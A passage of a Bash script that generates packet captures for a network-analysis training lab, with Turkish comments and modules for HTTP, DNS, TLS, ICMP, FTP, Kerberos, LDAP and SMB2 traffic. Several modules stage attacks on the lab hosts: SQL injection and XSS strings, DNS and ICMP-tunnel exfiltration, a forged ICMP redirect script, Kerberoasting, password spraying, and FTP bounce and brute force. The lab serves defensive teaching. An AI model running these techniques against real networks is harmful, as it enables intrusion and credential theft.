#!/bin/bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"

CREDENTIALS_FILE="${PROJECT_DIR}/shared/credentials.env"
if [ -f "${CREDENTIALS_FILE}" ]; then
    set -a
    source "${CREDENTIALS_FILE}"
    set +a
else
    echo "[HATA] ${CREDENTIALS_FILE} bulunamadı!"
    exit 1
fi

MODULE="${1:-all}"

# Cleanup function for trap: ensures tcpdump stops and netem removed on exit/interrupt
cleanup_on_exit() {
    docker exec shark-tank-client pkill tcpdump 2>/dev/null || true
    docker exec shark-tank-attacker pkill tcpdump 2>/dev/null || true
    docker exec shark-tank-tcp-echo tc qdisc del dev eth0 root 2>/dev/null || true
}
trap cleanup_on_exit EXIT INT TERM

start_capture() {
    local name="$1"
    echo "[CAPTURE] Başlatılıyor: ${name}"
    docker exec -d shark-tank-client tcpdump -i eth0 --immediate-mode -w "/pcaps/${name}.pcap" >/dev/null 2>&1 || true
    docker exec -d shark-tank-attacker tcpdump -i eth0 --immediate-mode -w "/tmp/${name}-attacker.pcap" >/dev/null 2>&1 || true
    sleep 1
}

stop_capture() {
    echo "[CAPTURE] Durduruluyor..."
    docker exec shark-tank-client pkill tcpdump 2>/dev/null || true
    docker exec shark-tank-attacker pkill tcpdump 2>/dev/null || true
    sleep 2
}

merge_attacker_pcap() {
    local name="$1"
    local client_pcap="${PROJECT_DIR}/shared/pcaps/${name}.pcap"
    local attacker_pcap="/tmp/${name}-attacker-merged.pcap"
    docker cp "shark-tank-attacker:/tmp/${name}-attacker.pcap" "${attacker_pcap}" 2>/dev/null || return 0
    if [ -f "${attacker_pcap}" ]; then
        CLIENT_PCAP="${client_pcap}" ATTACKER_PCAP="${attacker_pcap}" python3 -c "
import struct, sys, os

client_pcap = os.environ['CLIENT_PCAP']
attacker_pcap = os.environ['ATTACKER_PCAP']

def read_pcap(f):
    pkts = []
    hdr = f.read(24)
    if len(hdr) < 24: return hdr, []
    while True:
        ph = f.read(16)
        if len(ph) < 16: break
        ts_sec, ts_usec, incl_len, _ = struct.unpack('<IIII', ph)
        data = f.read(incl_len)
        if len(data) < incl_len: break
        pkts.append((ts_sec, ts_usec, data))
    return hdr, pkts

with open(client_pcap, 'rb') as f1:
    ghdr, pkts1 = read_pcap(f1)
with open(attacker_pcap, 'rb') as f2:
    _, pkts2 = read_pcap(f2)

all_pkts = pkts1 + pkts2
all_pkts.sort(key=lambda x: (x[0], x[1]))

with open(client_pcap, 'wb') as out:
    out.write(ghdr)
    for ts_sec, ts_usec, data in all_pkts:
        out.write(struct.pack('<IIII', ts_sec, ts_usec, len(data), len(data)))
        out.write(data)
" 2>/dev/null || true
        rm -f "${attacker_pcap}"
    fi
}

wait_for_service() {
    local host="$1"
    local port="$2"
    local proto="${3:-tcp}"
    local nc_opts="-z -w 1"
    [ "$proto" = "udp" ] && nc_opts="-u -z -w 1"
    local max=15
    local count=0
    while ! docker exec shark-tank-client nc $nc_opts "$host" "$port" 2>/dev/null; do
        count=$((count + 1))
        if [ $count -ge $max ]; then
            echo "  [UYARI] $host:$port ($proto) ulaşılamadı, devam ediliyor..."
            return 1
        fi
        sleep 1
    done
    return 0
}

generate_http() {
    echo ""
    echo "=== HTTP Trafiği Üretiliyor ==="
    wait_for_service 172.50.2.10 80
    start_capture "module-13-http"

    echo "  DNS çözümleme -> GET zinciri (delta analizi için)..."
    docker exec shark-tank-client dig @172.50.2.11 web.shark-tank.local +tries=1 +time=2 > /dev/null 2>&1 || true
    sleep 0.2
    docker exec shark-tank-client curl -s -H "Host: web.shark-tank.local" http://172.50.2.10/ > /dev/null
    sleep 0.3

    echo "  GET / (ana sayfa)..."
    docker exec shark-tank-client curl -s http://172.50.2.10/ > /dev/null
    sleep 0.3

    echo "  GET /api/data (JSON API)..."
    docker exec shark-tank-client curl -s http://172.50.2.10/api/data > /dev/null
    sleep 0.3

    echo "  GET /api/users..."
    docker exec shark-tank-client curl -s http://172.50.2.10/api/users > /dev/null
    sleep 0.3

    echo "  GET /secret (403 Forbidden)..."
    docker exec shark-tank-client curl -s http://172.50.2.10/secret > /dev/null
    sleep 0.3

    echo "  POST /auth (form verisi - şifre içerir)..."
    docker exec shark-tank-client curl -s -X POST -d "username=${HTTP_ADMIN_USER}&password=${HTTP_ADMIN_PASS}" http://172.50.2.10/auth > /dev/null
    sleep 0.3

    echo "  POST /auth (hatali giriş)..."
    docker exec shark-tank-client curl -s -X POST -d "username=${HTTP_GUEST_USER}&password=${HTTP_GUEST_PASS}" http://172.50.2.10/auth > /dev/null
    sleep 0.3

    echo "  POST /api/data (~60KB gövde - Content-Length toplama alıştırması)..."
    docker exec shark-tank-client sh -c 'i=0; body=""; while [ $i -lt 1000 ]; do body="$body kayit-$i|ag-izleme-raporu|analist-notu-$i|C4:F1:92:AA:B$i:1F|onaylandi\n"; i=$((i+1)); done; printf "%b" "$body" > /tmp/post-body.txt; wc -c /tmp/post-body.txt; curl -s -X POST --data-binary @/tmp/post-body.txt -H "Content-Type: text/plain" http://172.50.2.10/api/data > /dev/null'
    sleep 0.5

    echo "  Oturum cerezi (Set-Cookie -> Cookie zinciri)..."
    docker exec shark-tank-client sh -c 'curl -s -c /tmp/st-cookies.txt http://172.50.2.10/session > /dev/null && curl -s -b /tmp/st-cookies.txt http://172.50.2.10/api/data > /dev/null'
    sleep 0.3

    echo "  HTTP Basic auth (Authorization: Basic, base64)..."
    docker exec shark-tank-client curl -s -u "kame:hameha" http://172.50.2.10/api/data > /dev/null
    docker exec shark-tank-client curl -s -u "kame:hameha" http://172.50.2.10/secret > /dev/null
    sleep 0.3

    echo "  GET /chunked.txt (Transfer-Encoding: chunked)..."
    docker exec shark-tank-client curl -s -H "Accept-Encoding: gzip" http://172.50.2.10/chunked.txt > /dev/null
    sleep 0.3

    echo "  GET /large (büyük response - TCP segmentation)..."
    docker exec shark-tank-client curl -s http://172.50.2.10/large > /dev/null
    sleep 0.3

    echo "  GET /redirect (302)..."
    docker exec shark-tank-client curl -s -L http://172.50.2.10/redirect > /dev/null
    sleep 0.3

    echo "  GET /headers (özel header'lar)..."
    docker exec shark-tank-client curl -s -H "X-Forwarded-For: 10.0.0.1" -H "Cookie: session=abc123" http://172.50.2.10/headers > /dev/null
    sleep 0.3

    echo "  GET /nonexistent (404)..."
    docker exec shark-tank-client curl -s http://172.50.2.10/nonexistent > /dev/null
    sleep 0.3

    echo "  HEAD / ..."
    docker exec shark-tank-client curl -s -I http://172.50.2.10/ > /dev/null
    sleep 0.3

    echo "  Şüpheli istekler (SQL injection/XSS simülasyonu)..."
    docker exec shark-tank-client curl -s "http://172.50.2.10/api/data?id=1'+OR+1=1--" > /dev/null 2>&1 || true
    docker exec shark-tank-client curl -s "http://172.50.2.10/api/data?search=<script>alert(1)</script>" > /dev/null 2>&1 || true

    stop_capture
    echo "  Pcap: shared/pcaps/module-13-http.pcap"
}

generate_dns() {
    echo ""
    echo "=== DNS Trafiği Üretiliyor ==="
    wait_for_service 172.50.2.11 53
    start_capture "module-12-dns"

    echo "  A kaydı: web.shark-tank.local..."
    docker exec shark-tank-client dig @172.50.2.11 web.shark-tank.local A +short
    sleep 0.3

    echo "  A kaydı: secure.shark-tank.local..."
    docker exec shark-tank-client dig @172.50.2.11 secure.shark-tank.local A +short
    sleep 0.3

    echo "  A kaydı: target.shark-tank.local..."
    docker exec shark-tank-client dig @172.50.2.11 target.shark-tank.local A +short
    sleep 0.3

    echo "  CNAME kaydı: www.shark-tank.local..."
    docker exec shark-tank-client dig @172.50.2.11 www.shark-tank.local +short
    sleep 0.3

    echo "  MX kaydı: mail.shark-tank.local..."
    docker exec shark-tank-client dig @172.50.2.11 mail.shark-tank.local MX +short
    sleep 0.3

    echo "  NS kaydı: shark-tank.local..."
    docker exec shark-tank-client dig @172.50.2.11 shark-tank.local NS +short
    sleep 0.3

    echo "  AAAA kaydı (IPv6 adresi)..."
    docker exec shark-tank-client dig @172.50.2.11 web.shark-tank.local AAAA +short
    sleep 0.3

    echo "  Olmayan domain (NXDOMAIN)..."
    docker exec shark-tank-client dig @172.50.2.11 nonexistent.shark-tank.local +short
    sleep 0.3

    echo "  Dış domain: google.com..."
    docker exec shark-tank-client dig @172.50.2.11 google.com A +short
    sleep 0.3

    echo "  Dış domain: github.com..."
    docker exec shark-tank-client dig @172.50.2.11 github.com A +short
    sleep 0.3

    echo "  TXT kaydı denemesi..."
    docker exec shark-tank-client dig @172.50.2.11 shark-tank.local TXT +short
    sleep 0.3

    echo "  drill ile sorgu: echo.shark-tank.local..."
    docker exec shark-tank-client drill @172.50.2.11 echo.shark-tank.local A

    echo "  DNS exfiltration simülasyonu (uzun subdomain'ler)..."
    docker exec shark-tank-client dig @172.50.2.11 "c2NhcmFhcmFhLXNheWEtZGFsZ2EtZGU.bXV0ZXNpbGltZS0xMjM0.dmlsbGEtb25lLXNheWk.exfil.shark-tank.local" > /dev/null 2>&1 || true
    sleep 0.3
    docker exec shark-tank-client dig @172.50.2.11 "dG9wbHUtYmlyLXNpcmluLWRlLWthbGUtYmlsZS1kYXRhLWdvdGVy.dmlsbGEtaWtpLWRhaGE.bW9yZWQtZGF0YQ.exfil.shark-tank.local" > /dev/null 2>&1 || true
    sleep 0.3
    docker exec shark-tank-client dig @172.50.2.11 "Y2FmZS1hZGFtLWRhaGEtYmlsLW1peW9yLXRhbWEtZGUua2F5YmV0LWRlZ2lsLWNvZ3U.exfil.shark-tank.local" > /dev/null 2>&1 || true
    sleep 0.3

    stop_capture
    echo "  Pcap: shared/pcaps/module-12-dns.pcap"
}

generate_tcp() {
    echo ""
    echo "=== TCP Trafiği Üretiliyor ==="
    wait_for_service 172.50.2.12 8080
    start_capture "module-08-tcp"

    echo "  TCP echo server'a bağlanıyor (port 8080)..."
    docker exec shark-tank-client bash -c 'echo "Merhaba Shark-Tank" | nc -w 2 172.50.2.12 8080'
    sleep 0.5

    echo "  Birden fazla mesaj gönderiliyor..."
    docker exec shark-tank-client bash -c 'for i in 1 2 3 4 5; do echo "Mesaj $i" | nc -w 1 172.50.2.12 8080; sleep 0.3; done'
    sleep 0.5

    echo "  Uzun veri gönderiliyor..."
    docker exec shark-tank-client bash -c 'python3 -c "print(\"A\"*2000)" 2>/dev/null | nc -w 2 172.50.2.12 8080'
    sleep 0.5

    echo "  Port tarama (SYN scan - attacker'dan)..."
    docker exec shark-tank-attacker nmap -sS -p 21,22,25,80,443,8080,3306,5432 172.50.2.12 > /dev/null 2>&1 || true

    echo "  RST testi (kapalı port)..."
    docker exec shark-tank-attacker bash -c 'echo "test" | nc -w 1 172.50.2.12 22 2>/dev/null || true'

    stop_capture
    merge_attacker_pcap "module-08-tcp"
    echo "  Pcap: shared/pcaps/module-08-tcp.pcap"
}

generate_tls() {
    echo ""
    echo "=== TLS Trafiği Üretiliyor ==="
    wait_for_service 172.50.2.13 443

    echo "  SSL keylog dosyası temizleniyor..."
    docker exec shark-tank-client sh -c 'rm -f /tmp/sslkeys.log && touch /tmp/sslkeys.log'

    start_capture "module-16-tls"

    echo "  HTTPS GET / (ana sayfa)..."
    docker exec shark-tank-client sh -c 'SSLKEYLOGFILE=/tmp/sslkeys.log curl -sk https://172.50.2.13/' > /dev/null
    sleep 0.5

    echo "  HTTPS GET /secure-api..."
    docker exec shark-tank-client sh -c 'SSLKEYLOGFILE=/tmp/sslkeys.log curl -sk https://172.50.2.13/secure-api' > /dev/null
    sleep 0.5

    echo "  HTTPS GET /secure-data..."
    docker exec shark-tank-client sh -c 'SSLKEYLOGFILE=/tmp/sslkeys.log curl -sk https://172.50.2.13/secure-data' > /dev/null
    sleep 0.5

    echo "  HTTPS GET /cert-info..."
    docker exec shark-tank-client sh -c 'SSLKEYLOGFILE=/tmp/sslkeys.log curl -sk https://172.50.2.13/cert-info' > /dev/null
    sleep 0.5

    echo "  TLS sertifika bilgisi..."
    docker exec shark-tank-client openssl s_client -connect 172.50.2.13:443 -servername secure.shark-tank.local </dev/null 2>/dev/null | head -20

    echo "  HTTP vs HTTPS karşılaştırma (aynı anda)..."
    docker exec shark-tank-client curl -s http://172.50.2.10/api/data > /dev/null &
    docker exec shark-tank-client sh -c 'SSLKEYLOGFILE=/tmp/sslkeys.log curl -sk https://172.50.2.13/secure-api' > /dev/null &
    wait

    echo "  HTTPS POST..."
    docker exec shark-tank-client sh -c 'SSLKEYLOGFILE=/tmp/sslkeys.log curl -sk -X POST -d "secret_data=hidden_value" https://172.50.2.13/secure-api' > /dev/null 2>&1 || true

    echo "  TLS 1.2 zorlama (decryption için)..."
    docker exec shark-tank-client sh -c 'SSLKEYLOGFILE=/tmp/sslkeys.log curl --tlsv1.2 --tls-max 1.2 -sk https://172.50.2.13/secure-data' > /dev/null 2>&1 || true
    sleep 0.5
    docker exec shark-tank-client sh -c 'SSLKEYLOGFILE=/tmp/sslkeys.log curl --tlsv1.2 --tls-max 1.2 -sk https://172.50.2.13/secure-api' > /dev/null 2>&1 || true
    sleep 0.5

    echo "  Doğrulanmış zincir (curl --cacert, mini-CA root)..."
    docker exec shark-tank-client sh -c 'SSLKEYLOGFILE=/tmp/sslkeys.log curl -s --cacert /ca/ca.crt https://172.50.2.13/secure-data' > /dev/null 2>&1 || true
    sleep 0.5

    echo "  OCSP sorgusu (sertifika iptal durumu)..."
    docker exec shark-tank-client openssl ocsp -issuer /ca/ca.crt -cert /ca/server.crt \
        -url http://172.50.2.19:9080 -CAfile /ca/ca.crt 2>&1 | head -4 || true

    stop_capture

    echo "  SSL keylog dosyası kopyalanıyor..."
    docker cp shark-tank-client:/tmp/sslkeys.log "${PROJECT_DIR}/shared/certs/sslkeys.log" 2>/dev/null || true

    echo "  Pcap: shared/pcaps/module-16-tls.pcap"
    echo "  Keylog: shared/certs/sslkeys.log"
}

generate_icmp() {
    echo ""
    echo "=== ICMP Trafiği Üretiliyor ==="
    start_capture "module-05-icmp"

    echo "  Ping 172.50.2.14 (4 packet)..."
    docker exec shark-tank-client ping -c 4 172.50.2.14
    sleep 0.5

    echo "  Ping 172.50.2.10 (web server)..."
    docker exec shark-tank-client ping -c 3 172.50.2.10
    sleep 0.5

    echo "  Ping olmayan IP (timeout)..."
    docker exec shark-tank-client ping -c 2 -W 2 172.50.2.99 || true
    sleep 0.5

    echo "  Farklı boyutlarda ping..."
    docker exec shark-tank-client ping -c 2 -s 64 172.50.2.14
    docker exec shark-tank-client ping -c 2 -s 512 172.50.2.14
    docker exec shark-tank-client ping -c 2 -s 1400 172.50.2.14
    sleep 0.5

    echo "  ICMP Redirect denemesi (attacker: trafik kendine cekme)..."
    docker exec -i shark-tank-attacker python3 - <<'PYEOF' 2>/dev/null || true
import socket, struct

def cksum(data):
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack('!%dH' % (len(data)//2), data))
    s = (s >> 16) + (s & 0xffff); s += s >> 16
    return (~s) & 0xffff

def ipv4(src, dst, proto, payload):
    total = 20 + len(payload)
    hdr = struct.pack('!BBHHHBBH4s4s', 0x45, 0, total, 0x1337, 0x4000, 64, proto, 0,
                      socket.inet_aton(src), socket.inet_aton(dst))
    ck = cksum(hdr)
    hdr = hdr[:10] + struct.pack('!H', ck) + hdr[12:]
    return hdr + payload

# Orijinal "tetikleyici" paket: client(100) -> https(13):443 SYN
orig = ipv4('172.50.2.100', '172.50.2.13', 6,
            struct.pack('!HHIIBBHHH', 51000, 443, 1000, 0, 0x50, 0x02, 8192, 0, 0))
# ICMP Redirect Host: tip(1)+kod(1)+cksum(2)+gateway(4)+orijinal IP header
icmp = struct.pack('!BBH4s', 5, 1, 0, socket.inet_aton('172.50.2.200')) + orig
icmp = icmp[:2] + struct.pack('!H', cksum(icmp)) + icmp[4:]
pkt = ipv4('172.50.2.1', '172.50.2.100', 1, icmp)

s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
for _ in range(3):
    s.sendto(pkt, ('172.50.2.100', 0))
print('ICMP redirect gonderildi')
PYEOF
    sleep 0.5

    echo "  ICMP tüneli (attacker: echo payload'ina base64 veri gizler)..."
    docker exec -i shark-tank-attacker python3 - <<'PYEOF2' 2>/dev/null || true
import socket, struct, base64, time

def cksum(data):
    if len(data) % 2: data += b'\x00'
    s = sum(struct.unpack('!%dH' % (len(data)//2), data))
    s = (s >> 16) + (s & 0xffff); s += s >> 16
    return (~s) & 0xffff

# Tunelle "sizdirilacak" gizli mesaj: sabit ident + 400B'lik base64 bloklari
secret = b'CONFIDENTIAL-DB-DUMP:users=1247;hashes=NTLMx12;key=st-lab-secret-key-2026'
payload_base = base64.b64encode(secret * 16)  # ~1400 byte -> 3 echo paketi

s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
IDENT = 0x7354  # sabit identifier: tünel imzasi (gerçek ping'ler her pakette degisir)
off = 0
seq = 1
while off < len(payload_base):
    chunk = bytes([0x08, 0x00]) + b'ICMPTUN' + payload_base[off:off+480]
    off += 480
    icmp = struct.pack('!BBHHH', 8, 0, 0, IDENT, seq) + chunk
    icmp = icmp[:2] + struct.pack('!H', cksum(icmp)) + icmp[4:]
    s.sendto(icmp, ('172.50.2.100', 0))
    seq += 1
    time.sleep(0.15)
print('ICMP tunel gonderildi: %d paket, ident=0x%x' % (seq - 1, IDENT))
PYEOF2
    sleep 0.5

    stop_capture
    echo "  Pcap: shared/pcaps/module-05-icmp.pcap"
}

generate_ftp() {
    echo ""
    echo "=== FTP Trafiği Üretiliyor ==="
    wait_for_service 172.50.2.15 21
    start_capture "module-14-ftp"

    echo "  FTP login (credentials: ${FTP_USER} / ${FTP_PASS})..."
    docker exec shark-tank-client curl -s -u "${FTP_USER}:${FTP_PASS}" ftp://172.50.2.15/ > /dev/null 2>&1 || true
    sleep 1

    echo "  FTP dosya listesi..."
    docker exec shark-tank-client curl -s -u "${FTP_USER}:${FTP_PASS}" ftp://172.50.2.15/ 2>/dev/null || true
    sleep 1

    echo "  FTP dosya yükleme..."
    docker exec shark-tank-client bash -c "echo 'Shark-Tank Lab Test File - Bu dosya FTP ile yüklendi.' > /tmp/test-upload.txt && curl -s -T /tmp/test-upload.txt -u '${FTP_USER}:${FTP_PASS}' ftp://172.50.2.15/ 2>/dev/null || true"
    sleep 1

    echo "  FTP dosya indirme..."
    docker exec shark-tank-client curl -s -u "${FTP_USER}:${FTP_PASS}" ftp://172.50.2.15/test-upload.txt 2>/dev/null || true
    sleep 1

    echo "  Hatali FTP login (yanlış şifre)..."
    docker exec shark-tank-client curl -s -u "${FTP_USER}:${FTP_WRONG_PASS}" ftp://172.50.2.15/ 2>/dev/null || true
    sleep 1

    echo "  FTP raw komutlar (nc ile)..."
    docker exec shark-tank-client bash -c "printf 'USER ${FTP_USER}\r\nPASS ${FTP_PASS}\r\nSYST\r\nPWD\r\nPASV\r\nLIST\r\nQUIT\r\n' | nc -w 5 172.50.2.15 21" 2>/dev/null || true
    sleep 0.5

    echo "  FTP Active Mode (PORT komutu ile)..."
    docker exec shark-tank-client bash -c "(printf 'USER ${FTP_USER}\r\n'; sleep 0.4; printf 'PASS ${FTP_PASS}\r\n'; sleep 0.4; printf 'PORT 172,50,2,100,4,210\r\n'; sleep 0.4; printf 'LIST\r\n'; sleep 0.4; printf 'QUIT\r\n') | nc -w 6 172.50.2.15 21" 2>/dev/null || true
    sleep 0.5

    echo "  FTP bounce denemesi (PORT ile 3. tarafa bağlanma -> reddedilir)..."
    docker exec shark-tank-client bash -c "(printf 'USER ${FTP_USER}\r\n'; sleep 0.4; printf 'PASS ${FTP_PASS}\r\n'; sleep 0.4; printf 'PORT 172,50,2,16,0,25\r\n'; sleep 0.4; printf 'LIST\r\n'; sleep 0.4; printf 'PORT 172,50,2,14,39,116\r\n'; sleep 0.4; printf 'LIST\r\n'; sleep 0.4; printf 'QUIT\r\n') | nc -w 8 172.50.2.15 21" 2>/dev/null || true

    stop_capture
    echo "  Pcap: shared/pcaps/module-14-ftp.pcap"
}

generate_voip() {
    echo ""
    echo "=== VoIP Trafiği Üretiliyor ==="
    wait_for_service 172.50.2.22 5060 udp
    start_capture "module-25-voip"

    echo "  SIP REGISTER (1001) + REGISTER (1000)..."
    docker exec shark-tank-client python3 /sip-client.py 1001 ${SIP_PASS_1001} 1000 register 2>/dev/null || true
    sleep 1
    docker exec shark-tank-client python3 /sip-client.py 1000 ${SIP_PASS_1000} 1001 register 2>/dev/null || true
    sleep 1

    echo "  SIP INVITE + BYE (1000 → 1001)..."
    docker exec shark-tank-client python3 /sip-client.py 1000 ${SIP_PASS_1000} 1001 full 2>/dev/null || true
    sleep 2

    echo "  SIP INVITE + BYE (1001 → 1000)..."
    docker exec shark-tank-client python3 /sip-client.py 1001 ${SIP_PASS_1001} 1000 full 2>/dev/null || true

    stop_capture
    echo "  Pcap: shared/pcaps/module-25-voip.pcap"
}

generate_kerberos() {
    echo ""
    echo "=== Kerberos Trafiği Üretiliyor ==="
    wait_for_service 172.50.2.20 88
    start_capture "module-17-kerberos"

    echo "  1/5 Yanlis sifre denemesi (KRB-ERROR: PREAUTH_FAILED)..."
    docker exec shark-tank-client kdestroy 2>/dev/null || true
    printf 'yanlissifre!' | docker exec -i shark-tank-client \
        kinit analyst@SHARK-TANK.LOCAL 2>/dev/null || true
    sleep 1

    echo "  2/5 Gecerli kinit: AS-REQ/AS-REP (AES256, etype 18)..."
    printf "${AD_ANALYST_PASS}" | docker exec -i shark-tank-client \
        kinit ${AD_ANALYST_USER}@SHARK-TANK.LOCAL 2>/dev/null || true
    docker exec shark-tank-client klist 2>/dev/null | head -5 || true
    sleep 1

    echo "  3/5 Servis bileti: cifs SPN (TGS-REQ/TGS-REP, AES)..."
    docker exec shark-tank-client kvno cifs/dc.shark-tank.local \
        2>/dev/null || true
    sleep 1

    echo "  4/5 Kerberoasting simulasyonu: SPN taramasi (coklu TGS patlamasi)..."
    docker exec shark-tank-client \
        kvno -e rc4-hmac backup/svc-backup.shark-tank.local 2>/dev/null || true
    docker exec shark-tank-client \
        kvno backup/svc-backup.shark-tank.local 2>/dev/null || true
    sleep 1
    # Saldirgan: calinmis gecerli kimlik ile SPN taramasi (Kerberoast imzasi:
    # kisa surede cok sayida farkli SPN'e TGS istegi; son SPN RC4/etype 23 ile)
    printf "${AD_ANALYST_PASS}" | docker exec -i shark-tank-attacker \
        kinit ${AD_ANALYST_USER}@SHARK-TANK.LOCAL 2>/dev/null || true
    for spn in www/dc ldap/dc cifs/dc host/dc; do
        docker exec shark-tank-attacker \
            kvno "${spn}.shark-tank.local" 2>/dev/null || true
        sleep 0.4
    done
    docker exec shark-tank-attacker \
        kvno -e rc4-hmac backup/svc-backup.shark-tank.local 2>/dev/null || true

    echo "  5/5 Biletlerin temizlenmesi..."
    docker exec shark-tank-client kdestroy 2>/dev/null || true

    stop_capture
    merge_attacker_pcap "module-17-kerberos" || true
    echo "  Pcap: shared/pcaps/module-17-kerberos.pcap"
}

generate_ldap() {
    echo ""
    echo "=== LDAP Trafiği Üretiliyor ==="
    wait_for_service 172.50.2.20 389
    start_capture "module-18-ldap"

    echo "  1/5 Anonim rootDSE sorgusu..."
    docker exec shark-tank-client ldapsearch -x -H ldap://dc.shark-tank.local \
        -b "" -s base -LLL namingContexts 2>/dev/null || true
    sleep 1

    echo "  2/5 Simple bind: sifre duz metin visible..."
    docker exec shark-tank-client ldapsearch -x -H ldap://dc.shark-tank.local \
        -D "${AD_ANALYST_USER}@shark-tank.local" -w "${AD_ANALYST_PASS}" \
        -b "CN=Users,DC=shark-tank,DC=local" \
        -LLL "(sAMAccountName=${AD_ANALYST_USER})" cn mail 2>/dev/null || true
    sleep 1

    echo "  3/5 Hatali sifre ile simple bind (invalid credentials)..."
    docker exec shark-tank-client ldapsearch -x -H ldap://dc.shark-tank.local \
        -D "${AD_ANALYST_USER}@shark-tank.local" -w 'yanlissifre' \
        -b "CN=Users,DC=shark-tank,DC=local" -LLL "(cn=*)" cn \
        2>/dev/null | head -1 || true
    sleep 1

    echo "  3b/5 Sunucu tarafı limitler (timeLimit=120, sizeLimit=500)..."
    docker exec shark-tank-client ldapsearch -x -H ldap://dc.shark-tank.local \
        -D "${AD_ANALYST_USER}@shark-tank.local" -w "${AD_ANALYST_PASS}" \
        -b "CN=Users,DC=shark-tank,DC=local" \
        -l 120 -z 500 -LLL "(objectClass=*)" cn 2>/dev/null | head -4 || true
    sleep 1

    echo "  4/5 GSSAPI bind (Kerberos bileti ile) + grup sorgusu..."
    docker exec shark-tank-client kdestroy 2>/dev/null || true
    printf "${AD_ANALYST_PASS}" | docker exec -i shark-tank-client \
        kinit ${AD_ANALYST_USER}@SHARK-TANK.LOCAL 2>/dev/null || true
    docker exec shark-tank-client ldapsearch -H ldap://dc.shark-tank.local \
        -Y GSSAPI -b "CN=Users,DC=shark-tank,DC=local" \
        -LLL "(objectClass=group)" name 2>/dev/null | head -8 || true
    sleep 1

    echo "  5/5 StartTLS ve LDAPS karsilastirmasi..."
    docker exec -e LDAPTLS_REQCERT=never shark-tank-client \
        ldapsearch -ZZ -x -H ldap://dc.shark-tank.local \
        -D "${AD_ANALYST_USER}@shark-tank.local" -w "${AD_ANALYST_PASS}" \
        -b "" -s base -LLL dn 2>/dev/null || true
    sleep 0.5
    docker exec -e LDAPTLS_REQCERT=never shark-tank-client \
        ldapsearch -H ldaps://dc.shark-tank.local \
        -D "${AD_ANALYST_USER}@shark-tank.local" -w "${AD_ANALYST_PASS}" \
        -b "" -s base -LLL dn 2>/dev/null || true
    docker exec shark-tank-client kdestroy 2>/dev/null || true

    stop_capture
    echo "  Pcap: shared/pcaps/module-18-ldap.pcap"
}

generate_smb2() {
    echo ""
    echo "=== SMB2 Trafiği Üretiliyor ==="
    wait_for_service 172.50.2.20 445
    start_capture "module-19-smb2"

    echo "  1/4 Kerberos oturumu: negotiate → session setup → tree connect..."
    docker exec shark-tank-client kdestroy 2>/dev/null || true
    printf "${AD_ANALYST_PASS}" | docker exec -i shark-tank-client \
        kinit ${AD_ANALYST_USER}@SHARK-TANK.LOCAL 2>/dev/null || true

    echo "  2/4 Dosya operasyonlari: ls/get/put/delete..."
    docker exec shark-tank-client bash -c \
        'echo "shark-tank smb2 alistirma notu" > /tmp/not.txt && smbclient -k //dc.shark-tank.local/shark-share -c "ls; get rapor.txt /tmp/rapor-alindi.txt; put /tmp/not.txt not.txt; ls; del not.txt" 2>/dev/null' || true
    sleep 1

    echo "  2b/4 Buyuk dosya indirme (Read length toplama alıştırması)..."
    docker exec shark-tank-client bash -c \
        'head -c 96000 /dev/zero | tr "\\0" "D" > /tmp/veritabani.bin && smbclient -k //dc.shark-tank.local/shark-share -c "put /tmp/veritabani.bin veritabani.bin; get veritabani.bin /tmp/vt-alindi.bin; del veritabani.bin" 2>/dev/null' || true
    sleep 1

    echo "  2c/4 svcctl: uzaktan servis listeleme (PSExec ayak izi)..."
    docker exec shark-tank-client \
        services.py "shark-tank.local/administrator:${AD_ADMIN_PASS}"@dc.shark-tank.local list 2>/dev/null | head -8 || true
    sleep 1

    echo "  3/4 Yanlis sifre ile erisim (NTLM: STATUS_LOGON_FAILURE)..."
    docker exec shark-tank-client \
        smbclient //dc.shark-tank.local/shark-share analyst123x \
        -U "${AD_ANALYST_USER}" -c "ls" 2>/dev/null || true
    docker exec shark-tank-client kdestroy 2>/dev/null || true
    sleep 1

    echo "  4/4 Attacker: password spray (3 deneme)..."
    for sifre in Password1 Admin2026 yaz102026; do
        docker exec shark-tank-attacker \
            smbclient //dc.shark-tank.local/shark-share "${sifre}" \
            -U "${AD_ANALYST_USER}" -c "ls" 2>/dev/null || true
        sleep 0.5
    done

    stop_capture
    merge_attacker_pcap "module-19-smb2" || true
    echo "  Pcap: shared/pcaps/module-19-smb2.pcap"
}

generate_forensics() {
    echo ""
    echo "=== FORENSICS Trafiği Üretiliyor ==="
    start_capture "module-28-forensics"

    echo "  [1/7] Normal HTTP istekleri..."
    docker exec shark-tank-client curl -s http://172.50.2.10/ > /dev/null
    docker exec shark-tank-client curl -s -X POST -d "username=${HTTP_EMPLOYEE_USER}&password=${HTTP_EMPLOYEE_PASS}" http://172.50.2.10/auth > /dev/null
    docker exec shark-tank-client curl -s http://172.50.2.10/api/users > /dev/null
    sleep 1

    echo "  [2/7] Veri sızıntısı senaryosu (büyük JSON response)..."
    docker exec shark-tank-client curl -s http://172.50.2.10/api/users > /dev/null
    docker exec shark-tank-client curl -s http://172.50.2.10/large > /dev/null
    sleep 1

    echo "  [2b/7] Exfil POST (yüksek entropili base64 gövde - benign /auth ile karşılaştır)..."
    docker exec shark-tank-attacker sh -c 'python3 -c "import random,base64; random.seed(1337); open(\"/tmp/exfil.bin\",\"wb\").write(base64.b64encode(random.randbytes(1536)))"; wc -c /tmp/exfil.bin; curl -s -X POST --data-binary @/tmp/exfil.bin -H "Content-Type: application/octet-stream" -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" http://172.50.2.10/api/data > /dev/null' 2>/dev/null || true
    sleep 1

    echo "  [3/7] DNS sorguları (normal + şüpheli)..."
    docker exec shark-tank-client dig @172.50.2.11 web.shark-tank.local > /dev/null
    docker exec shark-tank-client dig @172.50.2.11 secure.shark-tank.local > /dev/null
    docker exec shark-tank-client dig @172.50.2.11 google.com > /dev/null
    sleep 1

    echo "  [3.5/7] Attacker: FTP brute force..."
    for pass in wrong1 wrong2 wrong3 wrongpassword admin123 letmein pass123; do
        docker exec shark-tank-attacker curl -s --connect-timeout 3 -u "${FTP_USER}:${pass}" ftp://172.50.2.15/ > /dev/null 2>&1 || true
        sleep 0.5
    done
